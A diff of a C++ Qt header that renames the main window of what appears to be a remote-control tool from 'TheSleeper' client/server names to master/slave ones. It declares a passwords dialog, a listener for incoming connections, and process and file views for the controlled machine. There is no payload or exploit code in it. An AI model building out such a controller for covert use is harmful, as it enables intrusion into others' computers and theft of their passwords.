@@ -1,46 +1,42 @@
-//!
-//!     Kaleidoscalp, all rights reserved.
-//!
-
-#ifndef _THE_SLEEPER_WINDOW_HPP_
-#define _THE_SLEEPER_WINDOW_HPP_
+#ifndef _MASTER_WINDOW_
+#define _MASTER_WINDOW_
 
 #include <list>
 
 #include <QStringListModel>
 #include <QDirModel>
 #include <QMainWindow>
-#include <ui_TheSleeper.h>
+#include <ui_Master.h>
 
-#include "ClientTableModel.hpp"
+#include "SlaveTableModel.hpp"
 #include "PasswordsDialog.hpp"
-#include "EditClientDialog.hpp"
+#include "EditSlaveDialog.hpp"
 
 #include <common/Log.hpp>
 #include <blaspheme/protocol/Session.hpp>
 #include <network/TcpClient.hpp>
 
-namespace TheSleeper
+namespace Master
 {
     using Network::TcpClient;
     using Blaspheme::Session;
 
     class ListeningThread;
     class GraphicTransferManager;
-    class Client;
+    class Slave;
     
-    typedef Client * ClientPtr;
-    typedef std::list<ClientPtr> ClientPtrList;
-    typedef std::list<ClientPtr>::iterator ClientPtrListIter;
+    typedef Slave * SlavePtr;
+    typedef std::list<SlavePtr> SlavePtrList;
+    typedef std::list<SlavePtr>::iterator SlavePtrListIter;
     
-    class ServerWindow : public QMainWindow, public Ui::MainWindow
+    class MasterWindow : public QMainWindow, public Ui::MainWindow
     {
         Q_OBJECT
 
         public:
         
-            ServerWindow(QWidget * parent = 0);
-            virtual ~ServerWindow();
+            MasterWindow(QWidget * parent = 0);
+            virtual ~MasterWindow();
             //void addAuxClient(Network::TcpClient, Blaspheme::SessionId id);
             //void closeEvent(QCloseEvent *event);
             
@@ -52,18 +48,18 @@ namespace TheSleeper
         
         private slots:        
         
-            void onNewClient(Session session);
+            void onNewSlave(Session session);
             void aboutQt();
             void about();
             
             // panneau de droite : gestion des clients
             void onListen();
             void onDisconnect();
-            void onChangeClient(const QModelIndex &);
+            void onChangeSlave(const QModelIndex &);
             
             // interface avec le thread des connexions
-            void onDisconnectedClient();
-            void switchClient();
+            void onDisconnectedSlave();
+            void switchSlave();
             void onFailedAuth();
             
             // barre de menu : onglet client
@@ -103,19 +99,19 @@ namespace TheSleeper
         private:
         
             // Dialogue pour naviguer dans les mots de passe
-            PasswordsDialog passwords_dialog;
+            PasswordsDialog passwordsDialog;
             
             // Dialogue pour éditer des executables client
-            EditClientDialog edit_client_dialog;
+            EditSlaveDialog editSlaveDialog;
             
             // Thread d'ecoute des connexions principales et auxiliaires
             ListeningThread * listener;
 
             // listes de tous les clients connectes en ce moment
-            ClientPtrList clients;
+            SlavePtrList slaves;
             
             // ce pointeur designe le serveur que l'on est en train de controler
-            ClientPtrList::iterator currentClient;
+            SlavePtrList::iterator currentSlave;
             
             // Barre d'etat, montre les proprietes du serveur que l'on est en train de controler
             QLabel * connectionStatusLabel;
@@ -124,12 +120,12 @@ namespace TheSleeper
             QLabel * infoIp;
             QLabel * infoPort;
             
-            ClientTableModel clientsModel;
-            QModelIndex current_index;
+            SlaveTableModel slavesModel;
+            QModelIndex currentIndex;
             QStringListModel processModel;
             QDirModel localFilesModel;
     };
 
-} // TheSleeper
+} // Slave
 
-#endif // _THE_SLEEPER_WINDOW_HPP_
+#endif // _MASTER_WINDOW_
